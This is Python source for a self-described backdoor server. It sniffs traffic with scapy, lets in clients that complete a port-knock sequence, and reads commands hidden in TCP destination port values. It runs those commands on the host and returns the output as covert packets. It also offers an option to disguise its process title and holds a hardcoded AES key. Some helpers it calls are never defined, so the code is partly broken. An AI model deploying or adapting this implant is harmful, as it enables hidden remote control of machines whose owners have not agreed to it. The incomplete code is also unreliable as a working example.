import time
import base64
import argparse
import collections
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from Crypto.Cipher import AES
CONN_IPS = collections.defaultdict(list)
CMDS = collections.defaultdict(list)
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"


def encrypt_val(text):
	secret = AES.new(MASTER_KEY)
	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
	cipher_text = base64.b64encode(secret.encrypt(tag_string))
	return cipher_text


def decrypt_val(cipher):
	secret = AES.new(MASTER_KEY)
	decrypted = secret.decrypt(base64.b64decode(cipher))
	result = decrypted.rstrip("\0")
	return result


def verify_root():
	if(os.getuid() != 0):
		exit("This program must be run with root/sudo")


def end_msg(dest):
	randPort = randint(1500, 65535)
	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=get_srcport())
	send(packet)


def send_msg(msg, ip):
    for char1, char2 in zip(msg[0::2], msg[1::2]):
        delay_sleep()
        send(char_packet(args.destIP, char1, char2))
    if(len(msg) % 2):
        delay_sleep()
        send(char_packet(args.destIP, msg[len(msg) - 1]))
    end_msg(args.destIP)


def run_cmd(packet, cmd):
	output = []
	try:
		command, arguments = cmd.split(' ', 1)
	except ValueError:
		command = cmd[0]
		arguments = None
	print("Running command: {} {}".format(command, arguments))
	try:
		if(arguments is not None):
			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
		else:
			out, err = Popen(cmd[0], stdout=PIPE, stderr=PIPE).communicate()
	except OSError:
		output = "Invalid Command / Command not found"
	if(out):
		output.append(out)
	if(err):
		output.append(err)
	# output = encrypt_val("".join(output))
	time.sleep(0.1)
	send_msg(''.join(output), packet[1].src)


def execute(packet, command):
	cmd = command.split(' ', 1)
	if(cmd[0] == "run"):
		run_cmd(packet, cmd[1])
	elif(cmd[0] == "watch"):
		print("STALK DIRS")
	else:
		print(cmd)


def decode(packet):
	ip = packet[1].src
	if(packet[1].id == 42424):
		execute(packet, ''.join(CMDS[ip]))
		CMDS[ip] = ""
	dport = packet[2].dport
	char1 = chr((dport >> 8) & 0xff)
	char2 = chr(dport & 0xff)
	if(char2 is not None):
		CMDS[ip] += "{}{}".format(char1, char2)
	else:
		CMDS[ip] += "{}".format(char1)


def port_knock_auth(packet):
	global CONN_IPS
	ip = packet[1].src
	dport = packet[2].dport
	access = [2525, 14156, 6364]
	dc = 4242

	# If the connecting IP has connected before
	if(ip in CONN_IPS):
		auth = CONN_IPS[ip]
		# Connecting IP is already authenticated
		if(auth == 3):
			if(dport == dc):
				del CONN_IPS[ip]
				print("{} has disconnected".format(ip))
				return
			decode(packet)
		elif(dport not in access):
			del CONN_IPS[ip]
		# Connecting IP matches second knock
		elif(dport == access[auth]):
			CONN_IPS[ip] += 1
		else:
			# Fail-safe
			del CONN_IPS[ip]
	elif(dport == access[0]):
		CONN_IPS[ip] = 1


def main():
	print("Sniffing for traffic...")
	sniff(filter="tcp", iface=args.iface, prn=port_knock_auth)


if __name__ == '__main__':
	verify_root()
	parser = argparse.ArgumentParser("Python backdoor server")
	parser.add_argument("-p", "--pname", help="Disguise process title")
	parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
	args = parser.parse_args()
	try:
		main()
	except KeyboardInterrupt:
		exit("Ctrl+C received. Exiting...")
